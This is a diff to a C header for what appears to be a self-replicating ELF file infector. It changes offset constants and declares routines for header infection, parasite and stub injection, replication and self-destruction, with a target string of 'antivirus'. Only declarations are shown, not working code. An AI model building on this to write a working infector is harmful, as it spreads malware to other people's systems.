@@ -37,26 +37,26 @@
 #define PAGE_SIZE 0x1000
 #define FCNT_SIZE 0x7
 #define CODE_SIZE 0x5
-#define OFFSET_SIZE 0xa
+#define OFFSET_SIZE 0x9
 
-#define ADDR_OFFSET 0x53
-#define SIZE_OFFSET 0x58
-#define KEY_OFFSET 0x2c
+#define STUB_OFFSET 0x1e
+#define STUB_SIZE_OFFSET 0x23
+#define PARASITE_OFFSET 0x2a
+#define PARASITE_SIZE_OFFSET 0x2f
 
 #define TARGET "antivirus"
 
-#define DEFAULT_KEY_SIZE 0x8
+#define SIGNATURE_SIZE 0x8
 
 #define OFFSET_1 0x19
-#define OFFSET_2 0x49
-#define OFFSET_3 0x6a
-#define OFFSET_4 0x96
-#define OFFSET_5 0xb4
-#define OFFSET_6 0xd5
-#define OFFSET_7 0xf9
-#define OFFSET_8 0x129
-#define OFFSET_9 0x15f
-#define OFFSET_A 0x17b
+#define OFFSET_2 0x41
+#define OFFSET_3 0x6d
+#define OFFSET_4 0x8b
+#define OFFSET_5 0xac
+#define OFFSET_6 0xd0
+#define OFFSET_7 0x100
+#define OFFSET_8 0x136
+#define OFFSET_9 0x152
 
 #define RBP 0x5d55
 #define RSP 0x5c54
@@ -173,7 +173,7 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
-void key(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
+void signature(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
